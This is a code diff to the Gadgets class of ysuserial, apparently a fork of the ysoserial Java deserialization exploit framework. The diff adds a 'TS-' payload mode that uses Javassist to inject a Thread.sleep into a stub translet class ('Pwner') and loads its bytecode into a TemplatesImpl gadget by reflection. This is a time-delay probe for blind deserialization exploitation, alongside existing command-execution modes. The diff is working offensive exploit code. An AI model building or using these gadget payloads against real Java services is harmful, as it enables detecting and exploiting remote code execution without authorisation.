@@ -9,9 +9,14 @@ import static org.su18.ysuserial.payloads.handle.GlassHandler.generateClass;
 import static org.su18.ysuserial.payloads.handle.GlassHandler.shrinkBytes;
 import static org.su18.ysuserial.payloads.util.Utils.*;
 
+import java.io.Serializable;
 import java.lang.reflect.*;
 import java.util.*;
 
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import javassist.*;
 
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -50,6 +55,23 @@ public class Gadgets {
 
 	public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
 
+	public static class StubTransletPayload extends AbstractTranslet implements Serializable {
+
+		private static final long serialVersionUID = -5971610431559700674L;
+
+
+		public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
+
+
+		@Override
+		public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
+	}
+
+	public static class Foo implements Serializable {
+
+		private static final long serialVersionUID = 8207363842866235160L;
+	}
+
 	public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
 		return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
 	}
@@ -85,6 +107,12 @@ public class Gadgets {
 			command = command.substring(1, command.length() - 1);
 		}
 
+		// use template gadget class
+		ClassPool pool = ClassPool.getDefault();
+		pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+		pool.insertClassPath(new ClassClassPath(ABST_TRANSLET));
+		final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+
 		CtClass ctClass      = null;
 		byte[]  classBytes   = new byte[0];
 		String  newClassName = generateClassName();
@@ -96,6 +124,32 @@ public class Gadgets {
 		// 扩展功能
 		if (command.startsWith("EX-") || command.startsWith("LF-")) {
 			ctClass = generateClass(command, newClassName);
+		} else if(command.startsWith("TS-")){
+
+			String cmd = "java.lang.Thread.sleep((long)" + (Integer.parseInt(command.split("[-]")[1]) * 1000) + ");";
+
+			clazz.makeClassInitializer().insertAfter(cmd);
+			// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+			clazz.setName("ysoserial.Pwner" + System.nanoTime());
+			CtClass superC = pool.get(ABST_TRANSLET.getName());
+			clazz.setSuperclass(superC);
+
+			final byte[] classBytes1 = clazz.toBytecode();
+
+			// inject class bytes into instance
+			Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+					classBytes1, ClassFiles.classAsBytes(Foo.class)
+			});
+
+			// required to make TemplatesImpl happy
+			Reflections.setFieldValue(templates, "_name", "Pwnr");
+			Reflections.setFieldValue(templates, "_tfactory", TRANS_FACTORY.newInstance());
+			return templates;
+//			ctClass = POOL.makeClass(newClassName);
+//			CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+//			ctConstructor.setBody("{Thread.sleep((long)\"" + (Integer.parseInt(command.split("[-]")[1]) * 1000) + "\");}");
+//			ctClass.addConstructor(ctConstructor);
+//			return templates;
 		} else {
 			// 普通的命令执行
 			if (IS_OBSCURE) {
